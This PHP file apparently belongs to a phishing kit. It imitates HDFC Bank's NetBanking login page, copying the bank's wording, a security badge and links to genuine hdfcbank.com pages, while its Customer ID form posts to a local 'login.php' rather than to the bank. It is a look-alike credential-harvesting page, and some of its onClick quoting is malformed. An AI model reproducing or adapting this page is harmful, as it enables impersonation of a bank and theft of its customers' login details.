<?php require_once "header.php"; ?>

<div class="container">
	<div class="row welcmewrap">
		<div class="welcomesec1">
			<div class="hdfcstatictxt mB20">Login to NetBanking</div>
			<div class="netwrapper">
				<div class="clearfix"></div>
				<div class="col-sm-6 leftwrap fl">
				    <form method="post" action="login.php">
                    	<div class="mB20">
                    		<div class="lablefield ibvt">Customer ID/ User ID</div>
                    		<div class="inputfield ibvt loginData">
                    			<input type="text" class="form-control text-muted" style="width: 245px;height: 30px" name="user_id" maxlength="15" size="13" required autofocus />
                    			<span><a href="https://netbanking.hdfcbank.com/netbanking/entry">Forgot Customer ID</a></span>
                    		</div>
                    	</div>
                    	
                    	<div class="mB20 continue">
                    		<div class="lablefield ibvt blank"></div>
                    		<div class="inputfield ibvt loginData">
                    		    <button class="btn btn-primary login-btn" type="submit">CONTINUE</button>
                    		</div>
                    	</div>
					</form>
					<div style="background-color:#e2effa;padding:10px;">
					    Dear Customer,
						<br/> Welcome to the new login page of HDFC Bank NetBanking.
						<br/> Its lighter look and feel is designed to give you the best possible user experience. Please continue to login using your customer ID and password.</div>
					<div class="hdfcstatictxt mB20">Don't have a HDFC Bank Savings Account?</div>
					<div class="hdfcsmalltxt mB20"> <span class="lightbluecolor"><a href="javascript:void(0)" onClick="return window.open("https://netbanking.hdfcbank.com/netbanking/CCLogin.html?v=1");">Credit Card only? Login here</a></span> </div>
					<div class="hdfcsmalltxt mB20"> <span class="lightbluecolor"><a href="javascript:void(0)" onClick="return window.open("https://v1.hdfcbank.com/assets/popuppages/Prepaid-card.htm?src=hp");">Prepaid Card only ? Login here</a></span> </div>
					<div class="hdfcsmalltxt mB20"> <span class="lightbluecolor"><a href="javascript:void(0)" onClick="return window.open("https://netbanking.hdfcbank.com/netbanking/LNLogin.html?v=1");">Retail Loan only? Login here</a></span> </div>
				</div>
			</div>
			<div class="welcomesec last">
				<div class="nwtquestwrap">
					<div id="nortonimg2" class="col-sm-5 rightwrap fr">
						<div class="nortonsecurity center lnheight">
						    <img src="images/nortonsecurity.png" alt="" />
					    </div>
						<div class="hdfcsmalltxt mB10">
						    <span class="color666">&nbsp;Your security is of utmost importance.</span>
						    <span class="lightbluecolor"><a href="javascript:void(0)" onClick="return window.open('https://www.hdfcbank.com/personal/useful-links/security');">&nbsp;Know More...</a></span>
						</div>
					</div>
				</div>
				<div class="col-sm-5 rightwrap fr" id="welcomesec2">
					<div>
						<br />
						<span class="hdfcstatictxt mB20">First Time User?</span>
						<br />
						<span class="lightbluecolor">
						    <a href="javascript:void(0)" onClick="return window.open('https://netbanking.hdfcbank.com/netbanking/registrationUsingOTP.htm');">Register Now </a>
						    for a host of convenient features
						</span>
					</div>
					<br />
					<div class="hdfcstatictxt mB20">We have added a host of new features!</div>
					<div class="hdfcsmalltxt mB10"> <span class="lightblackcolor">You can now do so much more:</span> </div>
					<div class="hdfcsmalltxt mB20">
					    <span class="lightblackcolor">
							<ul class="bullet">
								<li>Anywhere access through Desktop or mobile</li>
								<li>Enhanced security measures</li>
							</ul>
						</span>
					</div>
				</div>
				<div class="clearfix"></div>
			</div>
		</div>
	</div>
</div>

<?php include_once "footer.php"; ?>